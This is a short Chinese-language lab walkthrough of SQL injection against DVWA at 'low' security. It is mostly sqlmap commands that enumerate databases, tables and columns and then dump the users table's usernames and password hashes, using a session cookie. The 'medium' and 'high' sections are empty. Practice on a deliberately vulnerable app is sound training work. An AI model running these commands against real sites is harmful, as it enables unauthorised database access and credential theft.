# SQL Injection + sqlmap

> ## low

直接跑发现不可以

```shell
sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --flush-session
```



加上cookie再跑

```shell
sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=1elust7jg5psskq1k2un4gnp04; security=low" --dbs --flush-session
```



成功

```shell
[15:04:43] [INFO] fetching database names
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```



爆库

```shell
# 获取dvwa的所有表
sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=1elust7jg5psskq1k2un4gnp04; security=low" -D dvwa --tables --batch

# 获取users表的所有列
sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=1elust7jg5psskq1k2un4gnp04; security=low" -D dvwa -T users --columns --batch

# 获取users表其中几列的数据
sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=1elust7jg5psskq1k2un4gnp04; security=low" -D dvwa -T users -C "user,user_id,password" --dump --batch
```



<br>

> ## medium



<br>

> ## high



<br>